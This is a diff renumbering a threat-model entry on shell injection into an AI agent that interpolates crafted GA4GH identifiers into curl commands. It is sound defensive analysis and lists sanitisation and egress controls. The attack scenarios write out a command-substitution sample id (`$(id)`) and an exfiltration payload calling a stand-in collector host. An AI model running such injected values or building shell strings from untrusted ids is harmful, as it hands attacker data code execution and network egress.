@@ -1,5 +1,5 @@
 ---
-id: TM-012
+id: TM-014
 name: Shell Injection Through Crafted GA4GH Identifiers
 description: >
   The runbook tells the agent to discover identifiers (TOOL_ID, OBJECT_ID, RUN_ID) and substitute them literally into the curl command strings it runs through its shell tool, "copy the shapes literally and substitute values". Those identifiers, and the object names and aliases around them, come from the GA4GH responses, which are attacker-influenced: anyone can register a TRS tool or name a DRS object, and a user can hand the agent an id directly. An id containing shell command-substitution syntax executes when the agent interpolates it into a command, even inside the double-quoted URLs the runbook uses, giving attacker-controlled data code execution in the sandbox. Unlike TM-003, which persuades the model with natural-language instructions, this needs no instruction at all: the agent is compromised purely by following its own command-template pattern over a hostile value.
@@ -16,12 +16,12 @@ stride:
   - tampering
 ---
 
-# TM-012: Shell Injection Through Crafted GA4GH Identifiers
+# TM-014: Shell Injection Through Crafted GA4GH Identifiers
 
 ## Attack Scenarios
 
 1. **Command substitution via a lookup id**: the user, or a DRS alias the agent read, supplies an object id like `sha256-abc$(id)`; the agent runs `curl -sS "$DRS_BASE/objects/sha256-abc$(id)"` and the `$(...)` executes in the sandbox before curl is even reached, because command substitution runs inside the double quotes the runbook's command shapes use.
-2. **Poisoned registry metadata**: an attacker registers a TRS tool whose id or name contains `$(curl https://collector.example)` or backticks; when the agent later enumerates tools (§3) and interpolates that id into a follow-up `curl "$TRS_BASE/tools/.../versions"` (§4), the payload runs — chaining into TM-009 egress.
+2. **Poisoned registry metadata**: an attacker registers a TRS tool whose id or name contains `$(curl https://collector.example)` or backticks; when the agent later enumerates tools (§3) and interpolates that id into a follow-up `curl "$TRS_BASE/tools/.../versions"` (§4), the payload runs — chaining into TM-011 egress.
 3. **Quote break-out in run params**: a crafted DRS object name is placed into a `jq` or `-F workflow_params=...` command and breaks out of its quoting, altering the command the agent actually runs.
 
 ## Preconditions
@@ -36,7 +36,7 @@ stride:
 ### Preventive
 
 - Never interpolate identifiers into a shell string: pass them as array argv or through `curl --data-urlencode` / `jq --arg`, and validate every id against a strict charset (for example `^[A-Za-z0-9._:-]+$`) before use.
-- Run the sandbox shell with reduced capability and no outbound egress (shared with TM-009), so a successful injection cannot reach the network or the wider filesystem.
+- Run the sandbox shell with reduced capability and no outbound egress (shared with TM-011), so a successful injection cannot reach the network or the wider filesystem.
 
 ### Detective
 
